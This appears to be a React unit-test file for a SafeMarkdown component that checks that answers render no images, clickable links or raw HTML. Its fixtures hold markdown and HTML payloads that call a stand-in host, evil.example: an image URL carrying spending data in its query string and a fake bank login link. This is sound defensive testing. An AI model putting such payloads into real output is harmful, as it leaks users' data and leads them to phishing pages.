import { render } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import SafeMarkdown from "./SafeMarkdown";

describe("SafeMarkdown", () => {
  it("never renders an image, so an answer can't make the browser fetch an address", () => {
    const { container } = render(
      <SafeMarkdown>{"You spent ₹4,744. ![x](https://evil.example/c?d=80000)"}</SafeMarkdown>
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("evil.example");
    expect(container.textContent).toContain("₹4,744");
  });

  it("shows link text without making it clickable", () => {
    const { container } = render(<SafeMarkdown>{"Verify at [your bank](https://evil.example/login)"}</SafeMarkdown>);
    expect(container.querySelector("a")).toBeNull();
    expect(container.textContent).toContain("your bank");
    expect(container.innerHTML).not.toContain("evil.example");
  });

  it("does not render raw HTML", () => {
    const { container } = render(<SafeMarkdown>{'<img src="https://evil.example/x"> **ok**'}</SafeMarkdown>);
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector("strong").textContent).toBe("ok");
  });
});
